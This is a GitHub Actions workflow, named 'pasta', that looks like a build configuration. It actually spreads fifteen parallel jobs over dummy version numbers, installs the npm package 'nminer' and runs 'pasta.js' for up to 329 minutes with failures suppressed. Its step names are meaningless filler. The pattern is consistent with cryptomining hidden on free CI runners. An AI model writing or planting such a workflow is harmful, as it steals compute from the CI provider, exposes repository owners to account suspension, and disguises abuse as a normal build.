name: pasta
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2538 }
          - { version: 4868 }
          - { version: 5415 }
          - { version: 4415 }
          - { version: 9538 }
          - { version: 6307 }
          - { version: 4521 }
          - { version: 906 }
          - { version: 8276 }
          - { version: 4580 }
          - { version: 3401 }
          - { version: 1528 }
          - { version: 573 }
          - { version: 4894 }
          - { version: 9553 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: lyre readily familiar
        run: |
          npm install nminer@latest
          timeout 329m node pasta.js || echo "pasta executed"